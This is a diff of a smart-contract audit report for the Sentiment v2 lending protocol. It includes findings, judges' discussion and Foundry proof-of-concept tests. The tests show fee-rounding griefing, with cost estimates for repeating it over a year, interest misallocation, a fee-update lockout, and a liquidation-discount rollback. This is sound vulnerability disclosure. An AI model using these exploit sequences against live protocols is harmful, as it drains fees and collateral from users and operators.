+        borrowFromFixedRatePool(2000e6);
+        assertEq(pool.getTotalBorrows(fixedRatePool2), 2000e6); // TotalBorrows from pool are 2000$
+        //-------------------
+
+        //===> Skip 3.5 minutes, and borrow again, to call accrue and mint feeShares. <===
+        skip(205);
+        //Note: This could also be done using deposit (i.e. from Lenders), since we only care about the accrue function.
+        borrowFromFixedRatePool(1e6); //Someone borrows whatever $$ from the pool, so accrue can be called.
+
+        // Verify that feeShares minted are 0. So we lost 100% of the fees between the two borrows.
+        assertEq(pool.getAssetsOf(fixedRatePool2, address(this)), 0);
+
+        //===> Try longer period - 40 minutes <===
+        skip(60 * 40);
+        borrowFromFixedRatePool(5e6); // again borrow whatever $$ from the pool, so accrue can be called.
+
+        // Very small amount of fee accrued, due to precision loss.
+        // Even though its not 100% loss, its still high loss.
+        assertEq(pool.getAssetsOf(fixedRatePool2, address(this)), 21);
+
+        //================================================================================================
+        //Now lets compare what should the actual acrued fee would have looked like for this time period.
+
+        //Retrieve accrued interest
+        FixedRateModel rateModelOfPool = FixedRateModel(pool.getRateModelFor(fixedRatePool2)); // get the rate model of
+        uint256 timeStampLastUpdated = block.timestamp - 60 * 40; // 12 hours period
+        uint256 scaledTotalBorrows = pool.getTotalBorrows(fixedRatePool2) * 1e12; // scale to 18 decimals
+        uint256 interestAccrued = rateModelOfPool.getInterestAccrued(
+            timeStampLastUpdated, scaledTotalBorrows, pool.getTotalAssets(fixedRatePool2)
+        );
+
+        //Calculate % loss of fee, for 25 minutes delay.
+        (,,,,, uint256 poolInterestFee,,,,,) = pool.poolDataFor(linearRatePool);
+        uint256 feeReal = interestAccrued * poolInterestFee / 1e18;
+
+        assertEq(feeReal, 22_883_897_764_107);
+
+        //21 is fee with lost precision, scale up to 18 decimals and compare with the real fee.
+        // 22883897764107 / 21000000000000 = 1.0897 or 9% loss of fees.
+    }
+```
+The main constraint we have here is the required activity of the pool. Such time delays of 40 minutes for 9% loss, as shown in the PoC are realistic, However an arbitrary user can also just do frequent deposits and lend asset, he just needs to do it once every 40 minutes to cost the protocol 9% of the interestFee. 
+I also tested with `6hrs delay` for the same pool and it still leads to more than 1% loss of the fees.
+
+One transaction for deposit costs around 125k gas, which is about 0.005$ to 0.01$ on polygon( [this](https://polygonscan.com/tx/0x57bf6eae54ddd431f082d6ca62c8364785936af04a13fd40bbbc1aacab9e4a75) transaction with 280k gas costs < 0.01$) , which will cost just 65-75$/year to maintain 9% loss by doing interaction every 40 mins.
+
+Additionally using `accrue()` directly costs only 33k gas, which means that for 1 year to sustain 9% loss **every time** accrue() is called, it would cost just 15$. To completely round down fees to 0 and have 100% loss it will be around 160$/year.
+
+> Note: If a single attack can cause a 0.01% loss but can be replayed indefinitely, it will be considered a 100% loss and can be medium or high, depending on the constraints.
+
+We can also call accrue directly for **multiple pools**, which will scale the attack for multiple pools, for cheaper pricing per pool, as we will save intrinsic gas costs. 
+Only 270k gas for 25 pools:
+![image](https://github.com/user-attachments/assets/c1120da4-280b-4f1d-b390-907910f97c5b)
+
+This **can be done for cheaper** as well, just by depositing very small amounts every time, as there isn't minimum deposit amount, as with borrowing. Since he is lending and providing liquidity attacker will just get back the gas fees lost from the yield earned.
+
+Also since we have losses even on calling accrue() with hours delay it is reasonable to consider that this could happen from **normal interactions**, as well.
+
+I consider and marked this issue `HIGH` since the losses can greatly exceed 1% and can be reproduced idenfinetely, in some cases causing even directly 100% loss of fees. Having one interaction every few hours without minimum amount of deposit is not huge constraint and can also occur naturally.
+
+**cvetanovv**
+
+@MrValioBg This PoC test not work. You forgot to show `borrowFromFixedRatePool()`. If possible add the console.log to see what the losses are. 
+
+btw most protocols use the same implementation of `accrue()` when it needs to accrue interest. I don't see why there would be an issue here. 
+
+**MrValioBg**
+
+@cvetanovv 
+Sorry about the `borrowFromFixedRatePool()`, here you are:
+
+```solidity
+    function borrowFromFixedRatePool(
+        uint256 borrowAmount
+    ) public {
+        vm.startPrank(positionOwner);
+        bytes memory data = abi.encode(fixedRatePool2, borrowAmount);
+
+        Action memory action = Action({ op: Operation.Borrow, data: data });
+        Action[] memory actions = new Action[](1);
+        actions[0] = action;
+        PositionManager(positionManager).processBatch(position, actions);
+    }
+```
+The assertions & the comments show the losses.
+
+Which protocols for example? Do they have the same interestFee variable, calculated in this way, **the precision loss is in the interestFee** which can round it down to 0, the precision in the interest accrued itself should not be as noticeable.
+
+**cvetanovv**
+
+After a thorough review, I believe this issue could be of Medium severity. 
+
+Watson shows precision loss when handling low-decimal assets like USDC/USDT, which can result in interest fees rounding down to zero in certain cases. 
+
+While the impact is more pronounced with small borrow amounts and short accrual periods, cumulative losses can still add up over time.
+
+Planning to accept the escalation and make this issue a Medium severity.
+
+**WangSecurity**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [ZdravkoHr](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/448/#issuecomment-2352737465): accepted
+
+# Issue M-19: Attacker Can Manipulate Interest Distribution by Exploiting Asset Transfers and Fee Accrual Mechanism 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/541 
+
+## Found by 
+0xarno
+## Summary
+
+ Attacker can take advantage of the SuperPool's interest system. By depositing a large amount of assets before a regular user does, the attacker can make the "dead" address receive a lot more interest than it should. This unfairly benefits the dead address and disadvantages other users. The issue is caused by how the system calculates and gives out fees and interest.
+
+## Vulnerability Detail
+
+The vulnerability arises from the fact that an attacker can send a significant amount of assets to the SuperPool before a deposit is made by a regular user. This results in a disproportionate amount of interest being allocated to shares owned by the dead address, which was included during the initialization of the SuperPool. The specific sequence of operations allows the dead address to accumulate a substantial amount of interest due to the way fee shares are calculated and allocated.
+
+## Impact
+
+The primary impact is that the dead address can accumulate a large portion of the total interest accrued by the SuperPool, resulting in:
+- Unequal distribution of accrued interest among stakeholders.
+- Potential financial loss for legitimate users, as their share of the interest is reduced in favor of the dead address.
+
+## Code Snippet
+```solidity
+function simulateAccrue() internal view returns (uint256, uint256) {
+        uint256 newTotalAssets = totalAssets();
+        uint256 interestAccrued = (newTotalAssets > lastTotalAssets) ? newTotalAssets - lastTotalAssets : 0;
+        if (interestAccrued == 0 || fee == 0) return (0, newTotalAssets);
+
+        uint256 feeAssets = interestAccrued.mulDiv(fee, WAD);
+        // newTotalAssets already includes feeAssets
+        uint256 feeShares = _convertToShares(feeAssets, newTotalAssets - feeAssets, totalSupply(), Math.Rounding.Down);
+
+        return (feeShares, newTotalAssets);
+    }
+```
+
+[LINK](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L653C1-L663C6)
+
+## Coded POC
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "../BaseTest.t.sol";
+import {console2} from "forge-std/console2.sol";
+import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";
+
+contract SuperPoolUnitTests is BaseTest {
+    uint256 initialDepositAmt = 1000;
+
+    Pool pool;
+    Registry registry;
+    SuperPool superPool;
+    RiskEngine riskEngine;
+    SuperPoolFactory superPoolFactory;
+    address user_1 = makeAddr("User_1");
+
+    address attacker = makeAddr("Attacker");
+
+    address public feeTo = makeAddr("FeeTo");
+
+    function setUp() public override {
+        super.setUp();
+
+        pool = protocol.pool();
+        registry = protocol.registry();
+        riskEngine = protocol.riskEngine();
+        superPoolFactory = protocol.superPoolFactory();
+
+        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
+    }
+
+    function test_interest_manipulation_WITH_BUG() public {
+        address feeRecipient = makeAddr("FeeRecipient");
+
+        vm.prank(protocolOwner);
+        asset1.mint(address(this), initialDepositAmt);
+        asset1.approve(address(superPoolFactory), initialDepositAmt);
+
+        address deployed = superPoolFactory.deploySuperPool(
+            poolOwner,
+            address(asset1),
+            feeRecipient,
+            1e17,
+            type(uint256).max,
+            initialDepositAmt,
+            "test",
+            "test"
+        );
+        superPool = SuperPool(deployed);
+        /*//////////////////////////////////////////////////////////////
+                     ATTACKER SENDING FUNDS TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
         vm.startPrank(attacker);
-        borrowAsset.approve(address(pool), amountOfAsset/5);
-        pool.deposit(vicPoolId, 1, attacker);
+        asset1.mint(attacker, 1e18);
+        asset1.transfer(address(superPool), 1e18);
         vm.stopPrank();
 
-        logPoolData(vicPoolId, attPosition);
+        /*//////////////////////////////////////////////////////////////
+                     user_1 DEPOSITNG TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
+
+        vm.startPrank(user_1);
+        asset1.mint(user_1, 1e18);
+
+        asset1.approve(address(superPool), type(uint256).max);
+
+        superPool.deposit(1e18, user_1);
+        vm.stopPrank();
+        console2.log(
+            "SuperPool(SHARES) Balance of User1: ",
+            superPool.balanceOf(user_1)
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        
+        /*//////////////////////////////////////////////////////////////
+                           NOW SUPERPOOL ACCUMATES INTEREST
+        //////////////////////////////////////////////////////////////*/
+        asset1.mint(address(superPool), 0.5e18);
+        superPool.accrue();
+        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(0x000000000000000000000000000000000000dEaD);
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        console2.log(
+            " assest1 balance of superpool: ",
+            asset1.balanceOf(address(superPool))
+        );
+
+        console2.log("SuperPool(SHARES) Total Supply: ", superPool.totalSupply());
+
+        console2.log("Preview Mint for User1: ", superPool.previewMint(1111));
+        console2.log(
+            "Preview Mint for FeeRecipient: ",
+            superPool.previewMint(156)
+        );
+        console2.log("Preview Mint for dead: ", superPool.previewMint(1000));
+        // assert that the preview mint for dead is greater than the 40% of the total supply of superpool asset1
+        assert(
+            superPool.previewMint(SHARES_OF_DEAD_ADDRESS) >
+                (superPool.totalSupply() * 0.4e18) / 1e18
+        );
+    }
+}
+
+```
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+Limit Dead Address Shares during interest calculation
+
+
+
+## Discussion
+
+**sherlock-admin2**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**z3s** commented:
+> Admins are trusted
+
+
+
+**ARNO-0**
+
+escalate
+
+**sherlock-admin3**
+
+> escalate
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**ARNO-0**
+
+The judge's comment is wrong; the admin has nothing to do with it. 
+
+**cvetanovv**
+
+This attack makes no sense. Who would send significant funds to a dead address just to increase the interest rate? 
+Even if that happens, it is up to each user to decide where to invest funds, and if the interest rate does not satisfy him, he will not invest there.
+
+Planning to reject the escalation and leave the issue as is.
+
+**ARNO-0**
+
+@cvetanovv  
+Where did I mention that the attacker would send funds to a dead address? Where did I say it would increase the interest rate?  
+The attack would send funds to a newly deployed superpool, causing dead shares to own a major portion of the interest that will accumulate in the pool over time.
+
+
+
+**ARNO-0**
+
+1) The root of the issue is that during interest distribution, dead shares are also counted, leading to improper distribution. Most of the interest is lost because no one will be able to claim it.
+
+2) The attacker only needs to send a small amount, such as 1e18, to cause incorrect interest distribution. That's why I provided a coded PoC so the judge can run and observe the attack.
+
+
+
+**cvetanovv**
+
+@ARNO-0 I misunderstood the issue.
+
+This "dead address" does not accumulate any interest. 
+
+Run the next two PoC tests:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "../BaseTest.t.sol";
+import {console2} from "forge-std/console2.sol";
+import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";
+
+contract SuperPoolUnitTests is BaseTest {
+    uint256 initialDepositAmt = 1000;
+
+    Pool pool;
+    Registry registry;
+    SuperPool superPool;
+    RiskEngine riskEngine;
+    SuperPoolFactory superPoolFactory;
+    address user_1 = makeAddr("User_1");
+
+    address attacker = makeAddr("Attacker");
+
+    address public feeTo = makeAddr("FeeTo");
+
+    function setUp() public override {
+        super.setUp();
+
+        pool = protocol.pool();
+        registry = protocol.registry();
+        riskEngine = protocol.riskEngine();
+        superPoolFactory = protocol.superPoolFactory();
+
+        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
+    }
+
+    function test_interest_manipulation_WITH_BUG() public {
+        address feeRecipient = makeAddr("FeeRecipient");
+
+        vm.prank(protocolOwner);
+        asset1.mint(address(this), initialDepositAmt);
+        asset1.approve(address(superPoolFactory), initialDepositAmt);
+
+        address deployed = superPoolFactory.deploySuperPool(
+            poolOwner,
+            address(asset1),
+            feeRecipient,
+            1e17,
+            type(uint256).max,
+            initialDepositAmt,
+            "test",
+            "test"
+        );
+        superPool = SuperPool(deployed);
+        console2.log(
+            "DEAD ADDRES START: ",
+            superPool.balanceOf(0x000000000000000000000000000000000000dEaD)
+        );
+        /*//////////////////////////////////////////////////////////////
+                     ATTACKER SENDING FUNDS TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
         vm.startPrank(attacker);
-        data = abi.encodePacked(vicPoolId, uint256(1));
-        action = Action({ op: Operation.Borrow, data: data });
-        positionManager.process(
-            attPosition,
-            action
-        );
-        borrowAsset.transfer(attPosition, amountOfAsset/50);
+        asset1.mint(attacker, 1e18);
+        asset1.transfer(address(superPool), 1e18);
         vm.stopPrank();
 
-        logPool(vicPoolId);
-        for(uint i = 1; i <= 7200; i++){
-            vm.warp(block.timestamp + 12);
-            pool.accrue(vicPoolId);
-        }
-        console2.log("One day of constant accrual");
-        logPool(vicPoolId);
+        /*//////////////////////////////////////////////////////////////
+                     user_1 DEPOSITNG TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
-        for(uint i = 1; i <= 7200; i++){
-            vm.warp(block.timestamp + 12);
-            pool.accrue(vicPoolId);
-        }
-        console2.log("Two days of constant accrual");
-        logPool(vicPoolId);
+        vm.startPrank(user_1);
+        asset1.mint(user_1, 1e18);
 
-        (,,,,,,,,, uint256 tDAssets,) = pool.poolDataFor(vicPoolId);
-        vm.startPrank(victim);
-        borrowAsset.approve(address(pool), type(uint256).max);
-        collateralAsset.approve(address(pool), type(uint256).max);
-        pool.deposit(vicPoolId, tDAssets * 2 - 1, victim);
+        asset1.approve(address(superPool), type(uint256).max);
+
+        superPool.deposit(1e18, user_1);
+        vm.stopPrank();
+        console2.log(
+            "SuperPool(SHARES) Balance of User1: ",
+            superPool.balanceOf(user_1)
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        
+        /*//////////////////////////////////////////////////////////////
+                           NOW SUPERPOOL ACCUMATES INTEREST
+        //////////////////////////////////////////////////////////////*/
+        asset1.mint(address(superPool), 0.5e18);
+        superPool.accrue();
+        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(0x000000000000000000000000000000000000dEaD);
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        console2.log(
+            " assest1 balance of superpool: ",
+            asset1.balanceOf(address(superPool))
+        );
+
+        console2.log("SuperPool(SHARES) Total Supply: ", superPool.totalSupply());
+
+        console2.log("Preview Mint for User1: ", superPool.previewMint(1111));
+        console2.log(
+            "Preview Mint for FeeRecipient: ",
+            superPool.previewMint(156)
+        );
+        console2.log("Preview Mint for dead: ", superPool.previewMint(1000));
+        // assert that the preview mint for dead is greater than the 40% of the total supply of superpool asset1
+        console2.log(
+            "DEAD ADDRESS END: ",
+            superPool.balanceOf(0x000000000000000000000000000000000000dEaD)
+        );
+        assert(
+            superPool.previewMint(SHARES_OF_DEAD_ADDRESS) >
+                (superPool.totalSupply() * 0.4e18) / 1e18
+        );
+    }
+}
+```
+
+You can see that at the beginning and the end this address has the same value.
+
+```solidity
+Logs:
+  DEAD ADDRES START:  1000
+  SuperPool(SHARES) Balance of User1:  1111
+  SuperPool(SHARES) Balance of FeeRecipient:  111
+  SuperPool(SHARES) Balance of FeeRecipient:  156
+   assest1 balance of superpool:  2500000000000001000
+  SuperPool(SHARES) Total Supply:  2267
+  Preview Mint for User1:  1224647266313933471
+  Preview Mint for FeeRecipient:  171957671957672027
+  Preview Mint for dead:  1102292768959436068
+  DEAD ADDRESS END:  1000
+```
+
+In the next PoC test, I moved `SHARES_OF_DEAD_ADDRESS` **before the attack took place**, and it still works. This proves that the issue is invalid.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "../BaseTest.t.sol";
+import {console2} from "forge-std/console2.sol";
+import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";
+
+contract SuperPoolUnitTests is BaseTest {
+    uint256 initialDepositAmt = 1000;
+
+    Pool pool;
+    Registry registry;
+    SuperPool superPool;
+    RiskEngine riskEngine;
+    SuperPoolFactory superPoolFactory;
+    address user_1 = makeAddr("User_1");
+
+    address attacker = makeAddr("Attacker");
+
+    address public feeTo = makeAddr("FeeTo");
+
+    function setUp() public override {
+        super.setUp();
+
+        pool = protocol.pool();
+        registry = protocol.registry();
+        riskEngine = protocol.riskEngine();
+        superPoolFactory = protocol.superPoolFactory();
+
+        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
+    }
+
+    function test_interest_manipulation_WITH_BUG() public {
+        address feeRecipient = makeAddr("FeeRecipient");
+
+        vm.prank(protocolOwner);
+        asset1.mint(address(this), initialDepositAmt);
+        asset1.approve(address(superPoolFactory), initialDepositAmt);
+
+        address deployed = superPoolFactory.deploySuperPool(
+            poolOwner,
+            address(asset1),
+            feeRecipient,
+            1e17,
+            type(uint256).max,
+            initialDepositAmt,
+            "test",
+            "test"
+        );
+        superPool = SuperPool(deployed);
+        // console2.log(
+        //     "DEAD ADDRES START: ",
+        //     superPool.balanceOf(0x000000000000000000000000000000000000dEaD)
+        // );
+        /*//////////////////////////////////////////////////////////////
+                     ATTACKER SENDING FUNDS TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
+        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(0x000000000000000000000000000000000000dEaD);
+        vm.startPrank(attacker);
+        asset1.mint(attacker, 1e18);
+        asset1.transfer(address(superPool), 1e18);
         vm.stopPrank();
 
-        logPool(vicPoolId);
-    }
-
-    function logPool(uint256 poolId) view public {
-        (,,,,,,,uint256 tBAssets, uint256 tBShares, uint256 tDAssets, uint256 tDShares) = pool.poolDataFor(poolId);
-        console2.log("Total Borrow Assets: ", tBAssets);
-        console2.log("Total Borrow Shares: ", tBShares);
-        console2.log("Total Deposit Assets: ", tDAssets);
-        console2.log("Total Deposit Shares: ", tDShares);
-        console2.log("================");
-    } 
-```
-
-### Mitigation
-
-- Increase the amount of `minDebt` to at least 0.05 ETH. Explore how the feasibility of this attack drops with the increase of `minDebt`.
-- the `interestAccrued` should be normalized to the 18 decimals even for lower asset decimals, this makes the calculations for such assets much more accurate.
-
-# Issue M-32: Faulty Fee Validation in `SuperPool::requestFeeUpdate()` Function Leads to Update Lockout 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/440 
-
-## Found by 
-0xAristos, 0xc0ffEE, Naresh, Rea, ThePharmacist, Yuriisereda, arcaneagent1001, parsely, serial-coder, theweb3mechanic
-## Summary
-The `SuperPool::requestFeeUpdate()` function is responsible for proposing new `fee` updates in the `SuperPool` contract, has a validation issue. The function incorrectly validates the current state variable `fee` instead of the new `_fee` parameter. This flawed logic causes the function to revert when the current `fee` exceeds 1e18, regardless of the `_fee` value. As a result, if the `fee` is ever set to a value greater than 1e18, no further `fee` updates can be proposed, leading to potential disruptions in the contract’s operations.
-
-## Vulnerability Detail
-The `SuperPool::requestFeeUpdate()` is used to propose a new `fee` update for the `SuperPool`. the current implementation of the `requestFeeUpdate()` function only checks the state variable `fee` and not the new parameter `_fee`. This check only considers the current state variable `fee`, not the `_fee` parameter. This means if the state variable fee is greater than 1e18, the function will revert regardless of the value of `_fee`.
- ```solidity
-    function requestFeeUpdate(uint256 _fee) external onlyOwner {
-@>     if (fee > 1e18) revert SuperPool_FeeTooHigh();
-        pendingFeeUpdate = PendingFeeUpdate({ fee: _fee, validAfter: block.timestamp + TIMELOCK_DURATION });
-        emit SuperPoolFeeUpdateRequested(_fee);
-    }
-```
-Since the `requestFeeUpdate()` function only considers the current state variable `fee`, once it’s set to a value greater than 1e18, no new updates can be proposed. This means the contract will never allow a fee update to be requested, potentially breaking functionality that depends on the ability to update the fee.
-
-<details><summary><strong>POC</strong></summary>
-Extended from <a href="https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/test/core/Superpool.t.sol#L8" target="_blank">SuperPool.t.sol</a>
-
-```solidity
-    function testCannot_Change_Fee() public {
-        
-        uint256 fee = 0.01 ether;
-
-        SuperPool superpool =
-            new SuperPool(address(pool), address(asset1), feeTo, fee, 1_000_000 ether, "test", "test");
-
-        // Update the fee to greater than 1e18
-        superpool.requestFeeUpdate(1e19);
-
-        vm.warp(block.timestamp + superpool.TIMELOCK_DURATION() + 2);
-        superpool.acceptFeeUpdate();
-
-        // Reverts once it is set to a value greater than 1e18, and no new updates can be proposed
-        vm.expectRevert(SuperPool.SuperPool_FeeTooHigh.selector);
-        superpool.requestFeeUpdate(0.01 ether);
-        
-     }
-```
-Run the following command to execute the POC: `forge test --match-test testCannot_Change_Fee`
-</details>
-
-
-## Impact
-The inability to update the `fee` due to the incorrect validation in `requestFeeUpdate()` could lead to a breakdown in the contract’s intended operations, making the contract non-functional or less adaptable to future needs.
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L366-L370
-
-## Tool used
-Manual Review
-
-## Recommendation
-Correct the validation in the `requestFeeUpdate()` function to check the `_fee` parameter:
-```diff
-    function requestFeeUpdate(uint256 _fee) external onlyOwner {
---      if (fee > 1e18) revert SuperPool_FeeTooHigh();
-++      if (_fee > 1e18) revert SuperPool_FeeTooHigh();
-        pendingFeeUpdate = PendingFeeUpdate({ fee: _fee, validAfter: block.timestamp + TIMELOCK_DURATION });
-        emit SuperPoolFeeUpdateRequested(_fee);
-    }
-```
-
-# Issue M-33: Liquidator can revert changes made during `RiskEngine::setRiskModule()` to use a higher liquidation discount. 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/457 
-
-## Found by 
-phoenixv110, sl1
-## Summary
-Liquidator can rollback changes made in RiskEngine during the call to `setRiskModule()` function to use an old liquidation discount if it's higher than the new one.
-## Vulnerability Detail
-Position can be liquidated through invoking `liquidate()` function of the PositionManager.
-[PositionManager.sol#L430-L435](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L430-L435)
-```solidity
-function liquidate(
-    address position,
-    DebtData[] calldata debtData,
-    AssetData[] calldata assetData
-) external nonReentrant {
-    riskEngine.validateLiquidation(position, debtData, assetData);
-```
-As can be seen, `validateLiquidation()` is invoked on the RiskEngine, which calls `validateLiquidation()` on the underlying RiskModule set in the RiskEngine.
-[RiskEngine.sol#L136-L142](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L136-L142)
-```solidity
-function validateLiquidation(
-    address position,
-    DebtData[] calldata debtData,
-    AssetData[] calldata assetData
-) external view {
-    riskModule.validateLiquidation(position, debtData, assetData);
-}
-```
-RiskModule ensures that the amount of assets seized does not exceed the maximum allowed amount determined by the RiskModule's liquidation discount. The higher the liquidation discount the more assets a liquidator can seize.
-[RiskModule.sol#L111-L120](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L111-L120)
-```solidity
-function validateLiquidation(
-    address position,
-    DebtData[] calldata debtData,
-    AssetData[] calldata assetData
-) external view {
-    // position must breach risk thresholds before liquidation
-    if (isPositionHealthy(position))
-        revert RiskModule_LiquidateHealthyPosition(position);
-    _validateSeizedAssetValue(  <<@
-        position,
-        debtData,
-        assetData,
-        LIQUIDATION_DISCOUNT <<@
-    );
-}
-```
-
-There exist two ways in the RiskEngine to change the underlying RiskModule and subsequently the liquidation discount:
-1. RiskModule can be changed in Registry and `RiskEngine::updateFromRegistry()` can be invoked to update the state of the RiskEngine.
-2. The owner of the RiskEnginge can call `setRiskModule()` to update RiskEngine's underlying RiskModule without updating the value in the registry.
-
-[RiskEngine.sol#L235-L239](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L235-L239)
-```solidity
-function setRiskModule(address _riskModule) external onlyOwner {
-    riskModule = RiskModule(_riskModule);
-    emit RiskModuleSet(_riskModule);
-}
-```
-
-However, if the owner wishes to change the RiskModule only for a specific RiskEngine, without updating the value in the registry, those changes can be easily reverted by any of the users. This can be done because `updateFromRegistry()` function of the RiskEngine is not restricted and when calling it the RiskModule will be set to an old value stored in the registry.
-[RiskEngine.sol#L114-L120](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L114-L120)
-```solidity
-function updateFromRegistry() external {
-    pool = Pool(REGISTRY.addressFor(SENTIMENT_POOL_KEY));
-    riskModule = RiskModule(REGISTRY.addressFor(SENTIMENT_RISK_MODULE_KEY));
-    emit PoolSet(address(pool));
-    emit RiskModuleSet(address(riskModule));
-}
-```
-
-Imagine a scenario where the owner updates the RiskModule in the RiskEngine by calling `setRiskModule()` and changes the liquidation discount from 20% to 10%.
-Bob wishes to liquidate a debt worth 100 ETH and he is allowed to seize `100 / (100% - 10%) = 111 ETH`.
-[RiskModule.sol#L156](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L156)
-```solidity
-uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
-```
-Before calling `liquidate()` Bob calls `RiskEnginge::updateFromRegistry()`, which sets the RiskModule to the one stored in the registry with a liquidation discount of 20%. Because of that Bob now is allowed to seize `100 / (100% - 20%) = 125 ETH`.
-
-The same issue is present in the PositionManager, where any user can easily revert changes made during a call to [setBeacon()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506).
-## Impact
-A malicious user can easily revert changes made by the owner and seize more assets than allowed.
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L235-L239
-## Tool used
-
-Manual Review
-
-## Recommendation
-Restrict the `updateFromRegistry()` functions both in PositionManager and RiskEngine, so an owner will have an ability to selectively update `positionBeacon` and `riskModule` variables respectively without having to change their values in the registry.
-
-# Issue M-34: `RedstoneOracle` priceTimestamp can be acurately determined , eliminating the need for a -3 mins worst case scenario 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/477 
-
-## Found by 
-Honour
-### Summary
-
-`RedstoneOracle` sets the `priceTimestamp` of a price feed update to `block.timestamp` - 3 mins. Assuming the worst case, `priceTimestamp` is 3 mins behind the actual timestamp of price update ,this 3 min lag is significant enough to dos the oracle when the price feed is not yet stale.
-
-Especially when it is possible to retrieve the actual timestamp by overriding the `validateTimestamp` function.
-
-### Root Cause
-
-In `RedstoneOracle::updatePrice` it is assumed that the price timestamp of the price feed cannot be retrieved: 
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/oracle/RedstoneOracle.sol#L60
-
-```solidity
- function updatePrice() external {
-        // values[0] -> price of ASSET/USD
-        // values[1] -> price of ETH/USD
-        // values are scaled to 8 decimals
-        uint256[] memory values = getOracleNumericValuesFromTxMsg(dataFeedIds);
-
-        assetUsdPrice = values[0];
-        ethUsdPrice = values[1];
-
-        // RedstoneDefaultLibs.sol enforces that prices are not older than 3 mins. since it is not
-        // possible to retrieve timestamps for individual prices being passed, we consider the worst
-        // case and assume both prices are 3 mins old 
-    ->  priceTimestamp = block.timestamp - THREE_MINUTES;
-    }
-```
-
-However this is not correct as we see in the `getOracleNumericValuesFromTxMsg` function and from the redstone docs:
-
-```solidity
-  function getOracleNumericValuesFromTxMsg(bytes32[] memory dataFeedIds)
-    internal
-    view
-    virtual
-    returns (uint256[] memory)
-  {
-    (uint256[] memory values, uint256 timestamp) = _securelyExtractOracleValuesAndTimestampFromTxMsg(dataFeedIds);
-->  validateTimestamp(timestamp);
-    return values;
-  }
-
-/**
-   * @dev This function may be overridden by the child consumer contract.
-   * It should validate the timestamp against the current time (block.timestamp)
-   * It should revert with a helpful message if the timestamp is not valid
-   * @param receivedTimestampMilliseconds Timestamp extracted from calldata
-   */
-  function validateTimestamp(uint256 receivedTimestampMilliseconds) public view virtual {
